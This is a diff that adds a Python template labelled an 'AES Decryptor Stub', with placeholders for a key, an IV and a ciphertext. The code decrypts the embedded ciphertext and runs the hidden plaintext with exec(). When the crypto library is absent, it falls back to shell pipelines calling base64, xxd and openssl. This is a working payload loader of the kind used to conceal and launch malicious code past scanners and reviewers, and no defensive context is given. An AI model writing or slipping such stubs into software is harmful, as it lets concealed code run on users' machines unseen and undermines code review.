@@ -1,0 +1,50 @@
+import base64
+import os
+import sys
+import subprocess
+
+# Python AES Decryptor Stub
+# Tries to use cryptography lib, falls back to openssl command
+
+key_b64 = "{{ key }}"
+iv_b64 = "{{ iv }}"
+ct_b64 = "{{ ciphertext }}"
+
+try:
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.backends import default_backend
+    
+    key = base64.b64decode(key_b64)
+    iv = base64.b64decode(iv_b64)
+    ct = base64.b64decode(ct_b64)
+    
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    pt = decryptor.update(ct) + decryptor.finalize()
+    
+    # Remove padding (PKCS7)
+    pad_len = pt[-1]
+    pt = pt[:-pad_len]
+    
+    exec(pt.decode())
+
+except ImportError:
+    # Fallback to OpenSSL CLI (Linux/Mac)
+    try:
+        cmd_k = f"echo '{key_b64}' | base64 -d | xxd -p | tr -d '\\n'"
+        k_hex = subprocess.check_output(cmd_k, shell=True).decode().strip()
+        
+        cmd_iv = f"echo '{iv_b64}' | base64 -d | xxd -p | tr -d '\\n'"
+        iv_hex = subprocess.check_output(cmd_iv, shell=True).decode().strip()
+        
+        # We need to decrypt raw bytes.
+        # OpenSSL CLI expects raw input if not -a. 
+        # But we passed b64 ciphertext.
+        # echo CT_B64 | base64 -d | openssl ...
+        
+        cmd_dec = f"echo '{ct_b64}' | base64 -d | openssl enc -d -aes-256-cbc -K {k_hex} -iv {iv_hex}"
+        pt_bytes = subprocess.check_output(cmd_dec, shell=True)
+        
+        exec(pt_bytes.decode())
+    except Exception as e:
+        print(f"Decryption failed: {e}")
